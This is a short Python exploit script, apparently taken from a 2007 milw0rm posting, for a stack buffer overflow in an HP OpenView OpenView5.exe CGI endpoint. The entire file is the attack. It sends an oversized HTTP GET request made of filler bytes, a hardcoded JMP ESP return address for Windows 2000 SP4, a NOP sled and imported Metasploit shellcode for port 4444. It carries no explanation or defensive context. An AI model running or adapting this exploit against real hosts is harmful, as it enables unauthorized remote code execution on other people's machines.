#!/usr/bin/python
from time import sleep
from payload import buf
import socket


def shell_attack(target_machine, target_port):


    expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
   
    expl.connect ( ( target_machine, target_port ) )
  
    buffer=b"GET /OvCgi/OpenView5.exe?Context=Snmp&Action="
    buffer+=b"A"*5123
    buffer+=b"\x29\x4c\xe1\x77" # JMP ESP user32.dll Win2kSP4
    buffer+=b"\x90"*32
    # EXITFUNC=thread LPORT=4444 Size=696 Encoder=Alpha2 http://metasploit.com */
    buffer+=buf
    buffer+=b"\r\n\r\n"

    expl.send (buffer)
    expl.close()
    

    # milw0rm.com [2007-12-12]